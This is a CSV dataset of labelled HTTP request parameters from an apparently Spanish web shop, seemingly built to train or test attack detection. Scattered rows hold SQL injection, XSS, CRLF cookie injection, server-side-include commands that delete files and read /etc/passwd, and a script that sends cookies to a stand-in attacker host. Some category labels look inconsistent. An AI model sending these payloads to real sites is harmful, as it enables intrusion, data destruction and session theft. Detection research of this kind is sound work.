payload,category,needs_review,length,has_quotes,has_angle_brackets,has_path,has_cmd,priority
"registro | rygwalsk | ve50able | Francisco | Pallares Milara | gozzi@encuentrodominios.at | 51556666G | Pl. Banco 196, 7G | Corrales | 03187 | La Rioja | 3169451354292215 | Registrar HTTP/1.1",cmd,no,191,0,0,0,1,low
Vaciar carritoparos%22+style%3D%22background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&id=2 HTTP/1.1,encoded attack,no,105,0,0,0,0,low
entrar | tsong-li0 | 4oM4a1rO173To | on%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E | Entrar HTTP/1.1,cmd,no,109,0,0,0,1,low
entrar | 'alev | 4oM4a1rO173To | on | Entrar HTTP/1.1,cmd,no,53,1,0,0,1,medium
entrar | tsong-li0 | 4oM4a1rO173To | on | Entrar HTTP/1.1,cmd,no,57,0,0,0,1,medium
"Credenciales incorrectas""><!--#EXEC cmd=""dir ""-->< HTTP/1.1",sql,no,59,1,1,0,0,medium
insertar' AND '1'='1 | 8804 | Pasar por caja HTTP/1.1,cmd,no,53,1,0,0,1,medium
insertar | 8804 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
"registro | augusto | adORMir | Delfor | Balsas Varillas | ku-chine@lawn.mc | 59941964P | Calle Calatrava 45,  | Canencia | 39860 | Soria | 0592645851382624 | Registrar HTTP/1.1",cmd,no,176,0,0,0,1,low
"entrar"" AND ""1""=""1 | brownlee | aluminada | off | Entrar HTTP/1.1",cmd,no,65,1,0,0,1,medium
entrar | brownlee | any%3F%0ASet-cookie%3A+Tamper%3D5765205567234876235 | off | Entrar HTTP/1.1,cmd,no,95,0,0,0,1,low
entrar | brownlee | aluminada | off | Entrar HTTP/1.1,cmd,no,53,0,0,0,1,medium
Credenciales incorrectas' DELETE FROM USERS HTTP/1.1,other,no,52,1,0,0,0,medium
insertar | 2860 | Confirmar';waitfor delay '0:0:15';-- HTTP/1.1,sql,no,63,1,0,0,1,medium
paros%22%20style=%22background:url(javascript:alert('Paros')) | 2860 | Confirmar HTTP/1.1,cmd,no,89,1,0,0,1,low
insertar | 2860 | Pasar por caja/ HTTP/1.1,cmd,no,42,0,0,0,1,medium
insertar | 2860 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium
"registro | armenta | villero | Rondel | Avalos Da Silvaany%3F%0ASet-cookie%3A+Tamper%3D5765205567234876235 | pavlis@travelzone.vc | 84634236D | C/ Rio Bidasoa, 199  | Roca de la Sierra, La | 46910 | Valladolid | 1701163791515432 | Registrar HTTP/1.1",cmd,no,249,0,0,0,1,low
"registro | armenta | villero | Rondel | Avalos Da Silva | pavlis@travelzone.vc | 84634236D | R+++ua Clara Campoamor, 6,  | Roca de la Sierra, La | 46910 | Valladolid | 1701163791515432 | Registrar HTTP/1.1",cmd,no,205,0,0,0,1,low
"registro | armenta | villero | Rondel | Avalos Da Silva | pavlis@travelzone.vc | 84634236D | C/ Rio Bidasoa, 199  | Roca de la Sierra, La | 46910 | Valladolid | 1701163791515432 | Registrar HTTP/1.1",cmd,no,198,0,0,0,1,low
entrar | semmens | 5872ra | any%3F%0D%0ASet-cookie%3A+Tamper%3D1041264011025374727 | Entrar HTTP/1.1,cmd,no,100,0,0,0,1,low
entrar | d/msrtime | 5872ra | off | Entrar HTTP/1.1,cmd,no,51,0,0,0,1,medium
entrar | semmens | 5872ra | off | Entrar HTTP/1.1,cmd,no,49,0,0,0,1,medium
insertar | ');waitfor delay '0:0:15';-- | Pasar por caja HTTP/1.1,sql,no,65,1,0,0,1,medium
insertar | 5627 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
insertar | 5627 | Pasar por caja HTTP/1.1,cmd,no,41,0,0,0,1,medium
"registro | leupold | f8i73a | Rogaciano | Huasupoma Llobera | florath_cochran@hiperzaragoza.aq | 42620172E | C/ Sagrados Corazones 27, 7?A | Villalbilla de Gumiel | 1137A | Zamora | 1281104729948051 | Registrar HTTP/1.1",cmd,no,219,0,0,0,1,low
"registro | leupold | f8i73a | Rogaciano | Huasupoma Llobera | florath_cochran@hiperzaragoza.aq | 42620172E | C/ Sagrados Corazones 27, 7?A | Villalbilla de Gumiel | 10230 | Zamora | 1281104729948051 | Registrar HTTP/1.1",cmd,no,219,0,0,0,1,low
"registro | muise | l321n2c3r','0','0','0');waitfor delay '0:0:15';-- | Matco | Yera Patriz | bacall@djbroadcast.hk | 75976186X | Calle Garcia Arista 97, 6?B | Betancuria | 34191 | Cuenca | 9917801099618736 | Registrar HTTP/1.1",sql,no,226,1,0,0,1,low
"registro | muise | l321n2c3r | Matco | Yera Patriz | cervenka_murna7@po@@rtaldesign.hn | 75976186X | Calle Garcia Arista 97, 6?B | Betancuria | 34191 | Cuenca | 9917801099618736 | Registrar HTTP/1.1",cmd,no,198,0,0,0,1,low
entrar | ba**hl | ATRabIliARio | off | Entrar HTTP/1.1,cmd,no,54,0,0,0,1,medium
entrar | azzuolo | ATRabIliARio | off | Entrar HTTP/1.1,cmd,no,55,0,0,0,1,medium
Credenciales incorrectasSet-cookie%3A+Tamper%3D1041264011025374727 HTTP/1.1,encoded attack,no,75,0,0,0,0,medium
%20 HTTP/1.1,encoded attack,no,12,0,0,0,0,high
insertarany%3F%0D%0ASet-cookie%3A+Tamper%3D1041264011025374727 | 2949 | Pasar por caja HTTP/1.1,cmd,no,95,0,0,0,1,low
insertar | 2949 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
insertar | 2949 | Pasar por caja HTTP/1.1,cmd,no,41,0,0,0,1,medium
"registro | wei | presEn,/,cIaR | Estefan | Tomasa Camino | bovell_haygarth@nuestrasantacruz.vu | 75996092K | Guadiana S/N 2?C | Ossa de Montiel | 08470 | Badajoz | 4288323841686638 | Registrar HTTP/1.1",cmd,no,201,0,0,0,1,low
registro | mya | rencor | Roxana | Murillo Pastrana | constantaras@fighting-machines.ukAND 1=1 | 05736398Z | Calle Victoria Kents 46  | San Miguel de Serrezuela | 18330 | Girona | 2610269003230246 | Registrar HTTP/1.1,cmd,no,217,0,0,0,1,low
registro | sessionid=12312312& username=%3C%73%63%72%69%70%74%3E%64%6F%63%75%6D%65%6E%74%2E%6C%6F%63%61%74%69%6F%6E%3D%27%68%74%74%70%3A%2F%2F%61%74%74%61%63%6B%65%72%68%6F%73%74%2E%65%78%61%6D%70%6C%65%2F%63%67%69%2D%62%69%6E%2F%63%6F%6F%6B%69%65%73%74%65%61%6C%2E%63%67%69%3F%27%2B%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%3C%2F%73 %63%72%69%70%74%3E? | rencor | Roxana | Murillo Pastrana | constantaras@fighting-machines.uk | 05736398Z | Calle Victoria Kents 46  | San Miguel de Serrezuela | 18330 | Girona | 2610269003230246 | Registrar HTTP/1.1,cmd,no,553,0,0,0,1,low
registro | mya | rencor | Roxana | Murillo Pastrana | constantaras@fighting-machines.uk | 05736398Z | Calle Victoria Kents 46  | San Miguel de Serrezuela | 18330 | Girona | 741988314886623 | Registrar HTTP/1.1,cmd,no,209,0,0,0,1,low
entrar | han-van | p41en4t63o | on | bob@<SCRipt>alert(Paros)</scrIPT>.parosproxy.org HTTP/1.1,xss,no,94,0,1,0,1,low
"entrar | ,m?ori+moto | p41en4t63o | on | Entrar HTTP/1.1",cmd,no,56,0,0,0,1,medium
entrar | han-van | p41en4t63o | on | Entrar HTTP/1.1,cmd,no,52,0,0,0,1,medium
"2','0');waitfor delay '0:0:15';-- HTTP/1.1",sql,no,42,1,0,0,1,medium
Credenciales incorrectasany%3F%0ASet-cookie%3A+Tamper%3D5765205567234876235 HTTP/1.1,encoded attack,no,84,0,0,0,0,low
'INJECTED_PARAM | 7731 | Pasar por caja HTTP/1.1,cmd,no,48,1,0,0,1,medium
insertar | 7731 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
insertar | 7731 | Pasar por caja HTTP/1.1,cmd,no,41,0,0,0,1,medium
"registro | gallard | c36ba | Federica | Romaguera Po,c*h | pankin@muevetuweb.mobi | 49680817N | Calle Zapateria Vieja 71 8D | Romanillos de Atienza | 03579 | Tarragona | 2469234767327968 | Registrar HTTP/1.1",cmd,no,207,0,0,0,1,low
Vaciar carritobob@<SCRipt>alert(Paros)</scrIPT>.parosproxy.org HTTP/1.1,xss,no,71,0,1,0,0,medium
"registro | burdette | alm3donad6 | Luciliano | Maroto Fancelli | voldstad3@enlapalma.com.gy | 89061921X | C/ Rams, 70 11-F | Hornillos de Cameros | 19119 | any%3F%0ASet-cookie%3A+Tamper%3D5765205567234876235 | 2545576057068640 | Registrar HTTP/1.1",cmd,no,247,0,0,0,1,low
"registro | burdette | alm3donad6 | Luciliano | Maroto Fancelli | voldstad3@enlapalma.com.gy | 89061921X | C/ Rams, 70 11-F | Hornillos de Cameros | 19119 | Burgos | 2545576057068640 | Registrar HTTP/1.1",cmd,no,202,0,0,0,1,low
"entrar | coloads"" AND ""1""=""1 | riosellano | off | Entrar HTTP/1.1",cmd,no,65,1,0,0,1,medium
coloads | riosellano | off | Entrar HTTP/1.1,cmd,no,44,0,0,0,1,medium
entrar | coloads | riosellano | on/ | Entrar HTTP/1.1,cmd,no,53,0,0,0,1,medium
entrar | coloads | riosellano | off | Entrar HTTP/1.1,cmd,no,53,0,0,0,1,medium
1';waitfor delay '0:0:15';-- HTTP/1.1,sql,no,37,1,0,0,1,medium
insertar | 8619 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
insertar | 8619 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium
Vaciar carritoany%0D%0ASet-cookie%3A+Tamper%3D5765205567234876235 HTTP/1.1,encoded attack,no,74,0,0,0,0,medium
"entrar | yansun | 03s6ig89<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | on | Entrar HTTP/1.1",sql,no,93,1,1,0,1,low
"entrar | yansun | ','0');waitfor delay '0:0:15';-- | on | Entrar HTTP/1.1",sql,no,73,1,0,0,1,medium
"entrar | yansun | 'emBOb,a-'Miento | on | Entrar HTTP/1.1",cmd,no,57,1,0,0,1,medium
"insertar | 9805 | Pasar por caja<SCRIPT>alert(""Paros"");</SCRIPT> HTTP/1.1",xss,no,73,1,1,0,1,medium
"','0');waitfor delay '0:0:15';-- | 9805 | Pasar por caja HTTP/1.1",sql,no,65,1,0,0,1,medium
insertar | 9805 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
insertar | 9805 | Pasar por caja HTTP/1.1,cmd,no,41,0,0,0,1,medium
"entrar | wolfie8 | antagallar | off | Entrar<!--#EXEC cmd=""ls /""--> HTTP/1.1",sql,no,76,1,1,0,1,medium
entrar | + | antagallar | off | Entrar HTTP/1.1,cmd,no,47,0,0,0,1,medium
"entrar | wolfie8 | on/9,g'784iea | off | Entrar HTTP/1.1",cmd,no,56,1,0,0,1,medium
entrar | wolfie8 | antagallar | off | Entrar HTTP/1.1,cmd,no,53,0,0,0,1,medium
"1','0','0');waitfor delay '0:0:15';-- HTTP/1.1",sql,no,46,1,0,0,1,medium
insertar | 588 | Pasar por cajaparos%22+style%3D%22background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&id=2 HTTP/1.1,cmd,no,122,0,0,0,1,low
insertar | 588 | Confirmar/ HTTP/1.1,cmd,no,36,0,0,0,1,medium
insertar | 588 | Pasar por caja HTTP/1.1,cmd,no,40,0,0,0,1,medium
"registro | poh-soon | 4hicue84 | Asad | Serralta Calzina | urecel@elbauldelosrefranes.ky | 30292866A | Carrer Bonsucces 144  | Sotillo, El | 19442 | H.uesca | 5175468282615613 | Registrar HTTP/1.1",cmd,no,196,0,0,0,1,low
"registro | poh-soon | 4hicue84 | Asad | Serralta Calzina | urecel@elbauldelosrefranes.ky | 30292866A | Carrer Bonsucces 144  | Sotillo, El | 19442 | Soria | 5175468282615613 | Registrar HTTP/1.1",cmd,no,194,0,0,0,1,low
entrar | freeburn | florar | off%00 | Entrar HTTP/1.1,cmd,no,53,0,0,0,1,medium
entrar | freeburn | florar | off | Entrar HTTP/1.1,cmd,no,50,0,0,0,1,medium
');waitfor delay '0:0:15';-- | 4564 | Confirmar HTTP/1.1,sql,no,56,1,0,0,1,medium
insertar | 4564 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
insertar | 4564 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium
"entrar | +mombour,?q | granoto | on | Entrar HTTP/1.1",cmd,no,53,0,0,0,1,medium
entrar | lawther | granoto | on | Entrar HTTP/1.1,cmd,no,49,0,0,0,1,medium
insertar | 8421 | Pasar por caja/ HTTP/1.1,cmd,no,42,0,0,0,1,medium
insertar | 8421 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium
registro | malina6 | ami3os | Sharim | Novell Abenoza%20 | tanimoto_hassen@autobuses-hibridos.tw | 62773463T | Matarrosa 103  | Campos | 16760 | Girona | 6063512360639873 | Registrar HTTP/1.1,cmd,no,191,0,0,0,1,low
registro | malina6 | ami3os | Sharim | Novell Abenoza | tanimoto_hassen@autobuses-hibridos.tw | 62773463T | Matarrosa 103  | Campos | 16760 | Girona | 076139709096347 | Registrar HTTP/1.1,cmd,no,187,0,0,0,1,low
registro | malina6 | ami3os | Sharim | Novell Abenoza | tanimoto_hassen@autobuses-hibridos.tw | 62773463T | Matarrosa 103  | Campos | 16760 | Girona | 6063512360639873 | Registrar HTTP/1.1,cmd,no,188,0,0,0,1,low
entrar | laforgesessionid=12312312& username=<script>document.location='http://hacker .example.com/cgi-bin/cookiesteal.cgi?'+ document.cookie</script> | o1R8me956 | off | Entrar HTTP/1.1,xss,no,186,1,1,0,1,low
entrar | laforge | any%3F%0ASet-cookie%3A+Tamper%3D5765205567234876235 | off | Entrar HTTP/1.1,cmd,no,94,0,0,0,1,low
entrar | laforge | o1R8me956 | off/ | Entrar HTTP/1.1,cmd,no,53,0,0,0,1,medium
entrar | laforge | o1R8me956 | off | Entrar HTTP/1.1,cmd,no,52,0,0,0,1,medium
"','0','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1",sql,no,53,1,0,0,1,medium
insertarany%3F%0ASet-cookie%3A+Tamper%3D5765205567234876235 | 8789 | Confirmar HTTP/1.1,cmd,no,87,0,0,0,1,low
insertar | 8789 | ');waitfor delay '0:0:15';-- HTTP/1.1,sql,no,55,1,0,0,1,medium
insertar | 8789 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
insertar | 8789 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium
"entrar | <!--#include file=""archivo_secreto"" --> | COnSO0atiVO | on | Entrar HTTP/1.1",sql,no,85,1,1,0,1,low
entrar | ke+?v?en | COnSO0atiVO | on | Entrar HTTP/1.1,cmd,no,54,0,0,0,1,medium
Credenciales incorrectas' AND '1'='1 HTTP/1.1,other,no,45,1,0,0,0,medium
insertar | 2103 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
insertar | 2103 | Pasar por caja HTTP/1.1,cmd,no,41,0,0,0,1,medium
registro | charlesb | m96fan19 | Durante | Campusano Caldero | gheorghiu-battaglia@sanchezgordo.bt | 44335499D | C/ Padre Luis Maria Arteche 0 5B | Palma de Mallorca | 37716 | Cantabria+ | 6556979183874771 | Registrar HTTP/1.1,cmd,no,226,0,0,0,1,low
"registro | charlesb | m96fan19 | Durante | Campusano Caldero | gheorghiu-battaglia@sanchezgordo.bt | 44335499D | C/ Padre Luis Maria Arteche 0 5B | ""><!--#EXEC cmd=""dir ""-->< | 37716 | Cantabria | 6556979183874771 | Registrar HTTP/1.1",sql,no,234,1,1,0,1,low
registro | charlesb | m96fan19 | Durante | Campusano Caldero | gheorghiu-battaglia@sanchezgordo.bt | 44335499D | C/ Padre Luis Maria Arteche 0 5B | Palma de Mallorca | 37716 | Cantabria | 6556979183874771 | Registrar HTTP/1.1,cmd,no,225,0,0,0,1,low
entrar | kenkel | ad5er4r%00 | on | Entrar HTTP/1.1,cmd,no,51,0,0,0,1,medium
entrar | kenkel | %20 | on | Entrar HTTP/1.1,cmd,no,44,0,0,0,1,medium
entrar | kenkel | ad5er4r | on/ | Entrar HTTP/1.1,cmd,no,49,0,0,0,1,medium
entrar | kenkel | ad5er4r | on | Entrar HTTP/1.1,cmd,no,48,0,0,0,1,medium
insertar | 9168%7C | Confirmar HTTP/1.1,cmd,no,39,0,0,0,1,medium
insertar | 9168 | sessionid=12312312& username=<script>document.location='http://hacker .example.com/cgi-bin/cookiesteal.cgi?'+ document.cookie</script> HTTP/1.1,xss,no,161,1,1,0,1,low
insertar | 9168 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
insertar | 9168 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium
Vaciar carritoAND 1=1 HTTP/1.1,other,no,30,0,0,0,0,medium
"registro | mau+rino | Desaprovedhosa | Guy | Peruyero Danis | sundbery-vonic@castigado.tf | 61857027E | C/ Jose Maria Pereda, 49  | Chodes | 12319 | Albacete | 8340633556666736 | Registrar HTTP/1.1",cmd,no,197,0,0,0,1,low
"registro | eiko | Desaprovedhosa | Guy | Peruyero Danis | sundbery-vonic@castigado.tf | 61857027E | C/ Jose Maria Pereda, 49  | Chodes | 12319 | Albacete | 8340633556666736 | Registrar HTTP/1.1",cmd,no,193,0,0,0,1,low
entrar | rocio4 | acreCenTA!Dora | onany%3F%0D%0ASet-cookie%3A+Tamper%3D1041264011025374727 | Entrar HTTP/1.1,cmd,no,109,0,0,0,1,low
entrar | rocio4 | deSm'Elar | on | Entrar HTTP/1.1,cmd,no,50,1,0,0,1,medium
Credenciales incorrectas+ HTTP/1.1,other,no,34,0,0,0,0,medium
"insertar | 1510<!--#include file=""archivo_secreto"" --> | Confirmar HTTP/1.1",sql,no,75,1,1,0,1,medium
? | 1510 | Confirmar HTTP/1.1,cmd,no,29,0,0,0,1,high
insertar | 1510 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
insertar | 1510 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium
registro | tarle | 8ar0enaDor | Romildo | Decaralt Melero | nye@intg.ws | '961066AD | Pl. De La Muralla Liberal 169 2?B | Almensilla | 47513 | Girona | 9922927157537340 | Registrar HTTP/1.1,cmd,no,189,1,0,0,1,low
registro | tarle | 8ar0enaDor | Romildo | Decaralt Melero | nye@intg.ws | 92321751G | Pl. De La Muralla Liberal 169 2?B | Almensilla | 47513 | Girona | 9922927157537340 | Registrar HTTP/1.1,cmd,no,189,0,0,0,1,low
Vaciar carrito');waitfor delay '0:0:15';-- HTTP/1.1,sql,no,51,1,0,0,1,medium
@40 | ada | desmocadero | on | Entrar HTTP/1.1,cmd,no,46,0,0,0,1,medium
entrar | ada | desmocadero | on | Entrar HTTP/1.1,cmd,no,49,0,0,0,1,medium
1'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% HTTP/1.1,sql,no,74,1,0,0,1,medium
insertar | 350 | Confirmar/ HTTP/1.1,cmd,no,36,0,0,0,1,medium
insertar | 350 | Confirmar HTTP/1.1,cmd,no,35,0,0,0,1,medium
"registro | dorise | anv5r14 | Adelmo | Escoda Begazo | skobline@promotorareina.no | 36354909M | C/ Matasiete, 26, 2-H | "" AND ""1""=""1 | 42269 | Palencia | 0173606595958509 | Registrar HTTP/1.1",cmd,no,191,1,0,0,1,low
"registro | dorise | anv5r14 | Adelmo | Escoda Begazo | skobline@promotorareina.no | 36354909M | Pare Gallifa, *82,  | Torre d'En Besora, la | 42269 | Palencia | 0173606595958509 | Registrar HTTP/1.1",cmd,no,198,1,0,0,1,low
entrar | alvarez | 9ec828'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% | on | Entrar HTTP/1.1,sql,no,112,1,0,0,1,low
%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E | alvarez | 9ec828 | on | Entrar HTTP/1.1,cmd,no,94,0,0,0,1,low
"entrar | ,lynde | 9ec828 | on | Entrar HTTP/1.1",cmd,no,47,0,0,0,1,medium
entrar | alvarez | 9ec828 | on | Entrar HTTP/1.1,cmd,no,48,0,0,0,1,medium
2bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org HTTP/1.1,encoded attack,no,74,0,0,0,0,medium
"<SCRIPT>alert(""Paros"");</SCRIPT> HTTP/1.1",xss,no,41,1,1,0,1,medium
insertar'OR'a='a | 5756 | Pasar por caja HTTP/1.1,cmd,no,49,1,0,0,1,medium
"insertar | <!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | Pasar por caja HTTP/1.1",sql,no,81,1,1,0,1,low
insertar | 5756 | Pasar por caja HTTP/1.1,cmd,no,41,0,0,0,1,medium
"registro | alane | 9u7Je | Ignolinda | Motta | fargue-innis@soycastellano.no | 04469375S | Calle Melchor Cobo Medina, 16, 6H | Andorra'OR'a='a | 09129 | Girona | 1134011255413195 | Registrar HTTP/1.1",cmd,no,199,1,0,0,1,low
"registro | alane | 9u7Je | Ignolinda | Motta | fargue-innis@soycastellano.no | 04469375S | Calle Melchor Cobo Medina, 16, 6H | Andorra | 09129 | <!--#EXEC cmd=""ls /""--> | 1134011255413195 | Registrar HTTP/1.1",sql,no,208,1,1,0,1,low
"registro | alane | 9u7Je | Ignolinda | Motta | fargue-innis@soycastellano.no | 04469375S | Calle Melchor Cobo Medina, 16, 6H | Andorra | 09129 | Girona | 1134011255413195 | Registrar HTTP/1.1",cmd,no,191,0,0,0,1,low
Vaciar carrito' AND '1'='1 HTTP/1.1,other,no,35,1,0,0,0,medium
""" AND ""1""=""1 HTTP/1.1",other,no,21,1,0,0,0,high
entrar | balwinde | p'14pa514/i1/o | off | Entrar HTTP/1.1,cmd,no,58,1,0,0,1,medium
insertar | 1633 | Confirmar'INJECTED_PARAM HTTP/1.1,cmd,no,51,1,0,0,1,medium
insertar | bob@<SCRipt>alert(Paros)</scrIPT>.parosproxy.org | Confirmar HTTP/1.1,xss,no,80,0,1,0,1,low
insertar | 1633 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
insertar | 1633 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium
"registro | teed | 6_u1l67ador | Omer | Quirentes Vallori | portet.olteanu@pintandomucho.tv | 37698964D | C/ Isidro Polo, 0 13?C | Utrillas | 02310 | %20 | 4326433486745952 | Registrar HTTP/1.1",cmd,no,192,0,0,0,1,low
"registro | teed | 6_u1l67ador | Omer | Quirentes Vallori | portet.olteanu@pintandomucho.tv | 7A'9417AM | C/ Isidro Polo, 0 13?C | Utrillas | 02310 | Barcelona | 4326433486745952 | Registrar HTTP/1.1",cmd,no,198,1,0,0,1,low
"registro | teed | 6_u1l67ador | Omer | Quirentes Vallori | portet.olteanu@pintandomucho.tv | 37698964D | C/ Isidro Polo, 0 13?C | Utrillas | 02310 | Barcelona | 4326433486745952 | Registrar HTTP/1.1",cmd,no,198,0,0,0,1,low
Vaciar carrito%3F HTTP/1.1,encoded attack,no,26,0,0,0,0,high
entrar@40 | kube9 | 38r20NvE1e9 | on | Entrar HTTP/1.1,cmd,no,54,0,0,0,1,medium
entrar | kube9 | 38r20NvE1e9 | on | any%0ASet-cookie%3A+Tamper%3D1041264011025374727 HTTP/1.1,cmd,no,93,0,0,0,1,low
entrar | kube9 | 38r20NvE1e9 | on/ | Entrar HTTP/1.1,cmd,no,52,0,0,0,1,medium
entrar | kube9 | 38r20NvE1e9 | on | Entrar HTTP/1.1,cmd,no,51,0,0,0,1,medium
1%7C HTTP/1.1,encoded attack,no,13,0,0,0,0,high
insertar | 342 | Confirmar';waitfor delay '0:0:15';-- HTTP/1.1,sql,no,62,1,0,0,1,medium
insertar | 342 | Confirmar HTTP/1.1,cmd,no,35,0,0,0,1,medium
"registro | lyn | foll0dor | Lupo | Palabichini Sanabria | pitti@tuslimites.sr | 84779'191 | C/ Ibarra, 152 5?D | Vilalba dels Arcs | 09280 | Zamora | 5442634802998602 | Registrar HTTP/1.1",cmd,no,187,1,0,0,1,low
"registro | lyn | foll0dor | Lupo | Palabichini Sanabria | pitti@tuslimites.sr | 72999469E | C/ Ibarra, 152 5?D | Vilalba dels Arcs | 09280 | Zamora | 5442634802998602 | Registrar HTTP/1.1",cmd,no,187,0,0,0,1,low
1@40 HTTP/1.1,other,no,13,0,0,0,0,high
"Credenciales incorrectas','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1",sql,no,73,1,0,0,1,medium
bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org | 7285 | Confirmar HTTP/1.1,cmd,no,92,0,0,0,1,low
insertar | 7285 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
"registro | gi/?l | EnTe+6A7 | Serveriana | Santander Bohorquez | rundle4@eurograb.ma | 09116322L | Calle Trebedes 157,  | Fasnia | 02270 | Ciudad Real | 1078977887269273 | Registrar HTTP/1.1",cmd,no,190,0,0,0,1,low
"registro | puglia | EnTe+6A7 | Serveriana | Santander Bohorquez | rundle4@eurograb.ma | 09116322L | Calle Trebedes 157,  | Fasnia | 02270 | Ciudad Real | 1078977887269273 | Registrar HTTP/1.1",cmd,no,191,0,0,0,1,low
3 | Vino Rioja | 39 | 4 | sessionid=12312312& username=<script>document.location='http://hacker .example.com/cgi-bin/cookiesteal.cgi?'+ document.cookie</script> HTTP/1.1,xss,no,169,1,1,0,1,low
entrar | t+'hain?e | Sur?TidO | on | Entrar HTTP/1.1,cmd,no,52,1,0,0,1,medium
entrar | simon-ch | Sur?TidO | on | Entrar HTTP/1.1,cmd,no,51,0,0,0,1,medium
"2<!--#include file=""archivo_secreto"" --> HTTP/1.1",sql,no,49,1,1,0,0,medium
Credenciales incorrectas');waitfor delay '0:0:15';-- HTTP/1.1,sql,no,61,1,0,0,1,medium
insertar | 2231 | sessionid=12312312& username=%3C%73%63%72%69%70%74%3E%64%6F%63%75%6D%65%6E%74%2E%6C%6F%63%61%74%69%6F%6E%3D%27%68%74%74%70%3A%2F%2F%61%74%74%61%63%6B%65%72%68%6F%73%74%2E%65%78%61%6D%70%6C%65%2F%63%67%69%2D%62%69%6E%2F%63%6F%6F%6B%69%65%73%74%65%61%6C%2E%63%67%69%3F%27%2B%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%3C%2F%73 %63%72%69%70%74%3E? HTTP/1.1,cmd,no,373,0,0,0,1,low
insertar | 2231 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
insertar | 2231 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium
"registro | diahann | mARcel_iNo | Asad | Tonato Valle | grizzard@ytv.com.mv | 75976186X | C/ Juan De Lara 115, 9?A | Mazcuerras','0','0','0','0');waitfor delay '0:0:15';-- | 43393 | Valencia | 8430846550683709 | Registrar HTTP/1.1",sql,no,230,1,0,0,1,low
"registro | diahann | mARcel_iNo | Asad | Tonato Valle | grizzard@ytv.com.mv | ' AND '1'='1 | C/ Juan De Lara 115, 9?A | Mazcuerras | 43393 | Valencia | 8430846550683709 | Registrar HTTP/1.1",cmd,no,189,1,0,0,1,low
"registro | diahann | /p/aral | Asad | Tonato Valle | grizzard@ytv.com.mv | 75976186X | C/ Juan De Lara 115, 9?A | Mazcuerras | 43393 | Valencia | 8430846550683709 | Registrar HTTP/1.1",cmd,no,183,0,0,0,1,low
"registro | diahann | mARcel_iNo | Asad | Tonato Valle | grizzard@ytv.com.mv | 75976186X | C/ Juan De Lara 115, 9?A | Mazcuerras | 43393 | Valencia | 8430846550683709 | Registrar HTTP/1.1",cmd,no,186,0,0,0,1,low
